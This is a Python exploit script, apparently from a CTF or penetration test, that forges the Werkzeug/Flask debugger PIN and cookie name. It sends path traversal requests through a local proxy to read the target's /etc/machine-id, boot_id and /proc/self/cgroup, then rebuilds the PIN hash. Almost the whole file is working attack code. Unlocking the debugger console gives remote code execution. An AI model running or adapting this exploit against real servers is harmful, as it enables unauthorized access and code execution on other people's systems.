import typing as t 
import http.client
import urllib.parse
from itertools import chain
import sys
import uuid
import hashlib
import flask

app = flask.Flask(__name__)

modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)

try:
    import getpass
    username = getpass.getuser()
except (ImportError, KeyError, OSError):
    username = None

mod = sys.modules.get(modname)

probably_public_bits = [
    username,
    modname,
    getattr(app, "__name__", type(app).__name__),
    getattr(mod, "__file__", None)
]

def send_payload(url):
    try:
        PROXY_HOST = "127.0.0.1"
        PROXY_PORT = 8080
        
        parsed_url = urllib.parse.urlparse(url)
        conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=5)
        
        full_proxy_path = f"http://{parsed_url.netloc}{parsed_url.path}"
        if parsed_url.query:
            full_proxy_path += "?" + parsed_url.query
            
        conn.request("GET", full_proxy_path, headers={"Host": parsed_url.netloc})
        response = conn.getresponse()
        
        if response.status == 200:
            class MockResponse:
                def __init__(self, status_code, text):
                    self.status_code = status_code
                    self.text = text
            return MockResponse(response.status, response.read().decode('utf-8', errors='ignore'))
    except Exception:
        pass
    return None

def get_machine_id():
    HOST = "http://localhost:12345/../../../../.."
    linux = ""

    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        response = send_payload(HOST + filename)
        if response and response.status_code == 200:
            linux += response.text.strip()
            break

    response = send_payload(HOST + "/proc/self/cgroup")
    if (response.status_code == 200):
        linux += response.text.strip().rpartition("/")[2]

    return linux

private_bits = [str(uuid.getnode()), get_machine_id()]

h = hashlib.md5()
# h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)
h.update(b"cookiesalt")
# h.update(b'shittysalt')

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = None

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(f'PIN: {rv}', '\n', f'Cookie name: {cookie_name}')